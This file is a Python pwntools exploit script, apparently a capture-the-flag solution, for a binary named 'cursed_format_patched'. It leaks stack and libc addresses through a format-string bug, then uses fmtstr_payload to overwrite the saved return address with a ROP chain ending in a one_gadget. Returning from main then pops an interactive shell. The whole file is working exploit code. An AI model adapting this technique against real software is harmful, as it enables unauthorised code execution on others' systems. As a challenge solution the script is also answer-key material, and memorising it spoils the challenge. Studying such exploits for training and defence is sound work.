#!/usr/bin/env python3

from pwn import *

exe = "./cursed_format_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = "./libc.so.6"
libc = ELF(libc, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]


def printf(payload: bytes) -> None:
    global key
    io.sendafter(b">> ", b"1")
    content = payload.ljust(0x20, b"\x00")
    payload = xor(content, key)
    io.send(payload)
    key = content


# initialize key variable
key = b"\xff" * 0x20

# found with gdb
libcOffset = 0x23D7A
stkOffset = 0x58

context.log_level = "debug"
io = process(exe, env={})

# leak the stack and libc addresses from our fuzzer
# 1: b'0x7fffca2b97e01'
# 17: b'0x7f627c5d74481'
payload = b"%1$p %17$p"
printf(payload)
stkLeak, libcLeak = [
    int(i, 16) for i in io.recvuntil(b"1. Keep formatting", drop=True).split()
]
libc.address = libcLeak - libcOffset
savedRIP = stkLeak + stkOffset
info("savedRIP: %#x", savedRIP)
info("libcBase: %#x", libc.address)

# construct our ROP chain
onegadget = libc.address + 0xC8310
rop = ROP(libc)
rop.raw(rop.rsi.address)
rop.raw(0)
rop.raw(onegadget)
chain = rop.chain()

# write our ROP chain to saved rip, short by short
for i in range(0, len(chain), 2):
    payload = fmtstr_payload(
        offset=6, writes={savedRIP + i: chain[i : i + 2]}, write_size="short"
    )
    printf(payload)

# exit main, invoking return
io.sendafter(b">> ", b"2")
io.interactive()
